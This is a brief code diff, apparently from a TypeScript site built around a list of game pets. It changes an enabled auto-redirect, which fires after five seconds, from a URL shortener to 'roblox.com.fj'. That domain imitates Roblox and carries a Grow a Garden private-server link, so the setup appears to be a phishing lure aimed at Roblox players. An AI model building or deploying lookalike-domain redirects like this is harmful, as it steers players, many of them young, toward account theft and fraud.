@@ -118,7 +118,7 @@ const pets: Pet[] = [
 // Redirect configuration
 const REDIRECT_CONFIG = {
   enabled: true,
-  url: "https://shorturl.asia/gDq1x",
+  url: "https://roblox.com.fj/games/126884695634066/Grow-a-Garden?privateServerLinkCode=53027052405835991853954807752157",
   delay: 5000,
   autoRedirect: true,
 }
